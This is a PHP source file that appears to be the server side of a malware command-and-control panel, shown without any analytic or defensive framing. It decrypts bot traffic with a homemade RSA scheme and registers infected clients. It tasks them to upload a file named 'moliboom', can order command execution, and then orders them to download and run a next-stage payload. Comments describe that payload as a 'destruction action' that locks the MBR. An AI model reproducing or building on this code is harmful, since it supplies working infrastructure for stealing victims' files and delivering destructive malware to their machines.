<?php
$post_data = file_get_contents('php://input');
#$post_data = file_get_contents("input_raw.txt");

define("RET_YES",'YES');
define("RET_NO",'NO');
#客户端上行指令
define("GET_UPDATE",'get-upd');
define("GET_TASK",'get-tak');
define("GET_REG",'get-reg');
define("GET_REP",'get-rep');
#服务端上行指令
define("RUN_CMD",'run-cmd');
define("DOWN_EXEC",'dow-exe');
define("GET_FILE",'get-fle');

if (ISSET($post_data) && $post_data != NULL)
{
	$RSA_KEY = 301501;
	$RSA_N = 377753;

	#Http-Handle '{"c":1,"i":2,"e":3,"r":4,"x":5}'
	file_put_contents('input_raw.txt',$post_data);
	$post_data = parser_post($post_data,$RSA_KEY,$RSA_N);
	file_put_contents("input.txt",$post_data);
	$json_req = json_decode($post_data);

	$req_c = $json_req->{'c'};
	$req_i = $json_req->{'i'};
	$req_e = $json_req->{'e'};
	$req_x = $json_req->{'x'};
	#print_r([$req_c,$req_e,$req_i,$req_x]);
	
	#返回字段
	$ret_r = 'no';
	$ret_e = '';
	switch ($req_c)
	{
		case GET_REG:
			#注册ID	
			$ret = handle_get_reg($req_x,$req_e);
			break;
		case GET_TASK:
			$ret = handle_get_task($req_x,$req_e);
			$ret['e'] = json_encode($ret['e']);
			break;
		case GET_UPDATE:
			$ret = handle_get_update($req_x,$req_e);
			break;
		case GET_REP:
			#任务上报(在这里下发锁定MBR)
			$ret = handle_get_rep($req_x,$req_e);
			break;
	}
	$ret_r = $ret['r'];
	$ret_e = $ret['e'];
	$ret_text = "{'r':'$ret_r','e':'$ret_e'}";
	#echo $ret_text , "<br>";
	$ret_text = utf8_encode($ret_text);
	echo encode_echo($ret_text,$RSA_KEY,$RSA_N);
}

#注册
function handle_get_reg($uid,$ext)
{
	return array('r'=>RET_YES,'e'=>'ok_then_u_go');
}

#请求任务
function handle_get_task($uid,$ext)
{
	if ( file_exists("find_moliboom_ok") )
	{
		// 进行毁灭行动
		#$huimie = file_get_contents("abs_stage3.ps1");
		$url='http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]; 
		$huimie_url = dirname($url) . "/abs_stage3";
		$cmd = [
		"c" => DOWN_EXEC,
		"i" => '1',
		"e" => "$huimie_url",
		"x" => $uid,
		];
	}
	else	//find moliboom
	{
		$cmd1 = [
		"c" => RUN_CMD,
		"i" => '1',
		"e" => 'notepad.exe',
		"x" => $uid,
		];
		
		$cmd = [
		"c" => GET_FILE,
		"i" => '1',
		"e" => 'moliboom',
		"x" => $uid,
		];
	}
	return array('r'=>RET_YES,'e'=>$cmd);
}
#请求更新
function handle_get_update($uid,$ext)
{
	$cmd = [];
	return array('r'=>RET_NO,'e'=>'');
}
#任务上报
function handle_get_rep($uid,$req_e)
{
	$fname = generate_password();
	file_put_contents("find_moliboom_ok","");
	file_put_contents($fname,$req_e);
	//file_put_contents('upload.info.txt',$req_e);
	return array('r'=>RET_YES,'e'=>'');
}

// {'i':'','c':'', 'e': '', 'r':'','x':''}

// 解析post
function parser_post($post,$k,$n)
{
	$enc_text = "";
	$dat = base64_decode($post);
	$enc_dat = explode(" ",$dat);
	foreach ($enc_dat as $x )
	{
		$int_x = exp_mod ($x,$k,$n);
		//echo $int_x , " ";
		$enc_text .= chr($int_x);
	}
	
	return base64_decode($enc_text);
}

function string2tab($str)
{
	$re = array();
	for ($i = 0; $i < strlen($str); $i++)
	{
		$re[] = substr($str,$i,1);
	}
	return $re;
}

function encode_echo($txt,$k,$n)
{
	$txt = base64_encode($txt);
	$txt_tab = string2tab($txt);
	$ss = "";
	foreach ($txt_tab as $x)
	{
		$num = exp_mod(ord($x),$k,$n);
		$ss = $ss . "". sprintf("%d ",$num);
	}
	#echo $ss,"<br>";
	return base64_encode($ss);
}
function exp_mod($x,$h,$n)
{
	$y = "1";
	$x = "" . $x;
	$n = "" . $n;

	while ( $h > 0)
	{
		if ( ($h % 2)  == 0)
		{
			//$x = ($x * $x) % $n;
			$x = bcmod(bcmul($x,$x),$n);
			$h = $h /2;
		}
		else 
		{
			//$y = ($x * $y) % $n;
			$y = bcmod(bcmul($x,$y),$n);
			$h = $h - 1;
		}
		//echo "$x"," ","$h"," ","$y","<br>";
	}
	return intval ($y);
}


function generate_password( $length = 8 ) 
{ 
	// 密码字符集，可任意添加你需要的字符 
	$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
	$password = ""; 
	for ( $i = 0; $i < $length; $i++ ) 
	{ 
	// 这里提供两种字符获取方式 
	// 第一种是使用 substr 截取$chars中的任意一位字符； 
	// 第二种是取字符数组 $chars 的任意元素 
	// $password .= substr($chars, mt_rand(0, strlen($chars) – 1), 1); 
		$password .= $chars[ mt_rand(0, strlen($chars) - 1) ]; 
	} 
	return $password;
}	
?>
